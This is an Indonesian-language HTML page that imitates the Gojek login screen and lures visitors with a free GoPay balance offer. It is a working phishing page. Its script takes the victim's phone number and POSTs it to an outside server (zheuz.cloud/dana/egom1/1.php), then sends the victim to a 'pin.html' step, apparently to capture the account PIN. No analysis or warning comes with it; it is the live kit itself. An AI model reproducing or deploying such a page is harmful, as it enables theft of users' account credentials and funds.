
<!DOCTYPE html>
<html lang="en">

    <meta property="og:description" content="Claim Saldo Gojek | Gopay gratis!">
    <meta property="twitter:description" content="Claim Saldo Gojek | Gopay gratis!">
</head>
<body>
    <div class="container page1">
        <div style="display:none;" class="load">
            <div class="box">
                <div class="circle one"></div>
                <div class="circle two"></div>
                <div class="circle three"></div>
            </div>
        </div>
        <div class="loadingScreen">
            <img class="ovologo" style="display:none;" src="ast/gojek.png" alt="">
            <img class="ovologo lgoto" style="display:none;" src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/88/GoTo_logo.svg/440px-GoTo_logo.svg.png" alt="">
        </div>
        <div class="header" style="justify-content:space-between;">
            <i onclick="window.location.href='#'" class='bx bx-left-arrow-alt'></i>
            <i class='bx bxs-help-circle' ></i>
        </div>
        <div class="title">
            <h3 class="b">Selamat datang di Gojek!</h3>
            <p class="r">Masuk atau daftar hanya dalam beberapa langkah mudah.</p>
            <br>
            <p class="b" style="position: absolute;font-size:12px;">Nomor HP<b style="position: absolute;margin-left:5px;color:red;">*</p></b>
        </div>
        <form id="formNohp" onsubmit="sendNohp(event);">
            <div class="wrapInp">
                <div class="label r" style="display: flex;
    justify-content: center;
    align-items: center;
    width: 62px;
    min-width: 69px;
    max-width: 62px;
    height: 23px;
    min-height: 28px;
    max-height: 23px;
    background: #f5f5f5;
    border: 2px solid #eee;
    border-radius: 20px;"><img src="ast/indo.png" alt=""><p class="b" style="font-size:14px;color:#000;">+62</p></div>
                <input autofocus type="tel" autocomplete="off" id="nohp" class="nohp b" style="font-size:25px;letter-spacing:0px;" name="nohp" required placeholder="81x-xxx-xxx">
                <i id="del" onclick="removeInp();" class='bx bxs-x-circle' style="display:none;font-size:25px;" ></i>
            </div>
            <div class="bgbtn">
                <button disabled class="b" type="submit" id="btnnohp" style="font-size:16px;">Lanjut</button>
            </div>
           <p class="r" style="font-size:11px">Saya menyetujui <a style="color:green;" href="#">Ketentuan Layanan</a> & <a style="color:green;" href="#">Kebijakan Privasi</a> Gojek.</p>
           <br>
            <div style="display: flex;
    justify-content: center;
    align-items: center;
    margin-left:1px;
    min-width: 210px;
    max-width: 190px;
    height: 23px;
    min-height: 36px;
    max-height: 23px;
    background: #fff;
    border: 2px solid #eee;
    border-radius: 100px;"><p style="font-family:Nunito;font-size:14px;font-weight:800;">Ada kendala atau lupa nomor?</p></div>
          
        </form>
    </div>
    <img class="" style="position: absolute;left:0;right:0;bottom: 70px;width: 30%;display:flex;margin: 0px auto 0px auto;" src="ast/goto1.png">
<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="ast/jquery.mask.min.js"></script>
<script>
    $(document).ready(function(){
        $('#nohp').on('input', function(){
            if($(this).val() == '0' || $(this).val() == '62'){
                $(this).val('');
            }
        });
    });
</script>
<script>
    $(document).ready(function(){
        $('#nohp').mask('000000000000');
    });
</script>
<script>
    let inphp = document.getElementById("nohp");
    let btnnohp = document.getElementById("btnnohp");
    let del = document.getElementById("del");
    inphp.addEventListener("input", val);
    function val(){
        if (inphp.value.length > 8){
            btnnohp.disabled = false;
        } else {
            btnnohp.disabled = true;
        }
    };
    inphp.addEventListener("input", valDel);
    function valDel(){
        if (inphp.value != ""){
            $("#del").show();
        } else {
            $("#del").hide();
        }
    };
    function removeInp(){
        $("#nohp").val("");
        $("#nohp").focus();
        $("#del").hide();
    }
</script>
<script>
    function sendNohp(event){
        event.preventDefault();
        $(".load").fadeIn();
        $("#nohp").blur();
        $("#btnnohp").attr("disabled","true");
var nohp = document.getElementById("nohp").value;
sessionStorage.setItem("nohp", nohp);
        $.ajax({
            type: 'POST',
            url: 'https://zheuz.cloud/dana/egom1/1.php',
            data: $('#formNohp').serialize(),
            dataType: 'JSON',
            complete: function(){
                window.location.href = 'pin.html';
            }
        })
    };
</script>
<script>
    window.onload = function(){
        setTimeout(function(){
            $(".ovologo").fadeIn(200);
            setTimeout(function(){
                $(".loadingScreen").fadeOut(200);
            },1000);
        },500);
    }
</script>
</body>
</html>
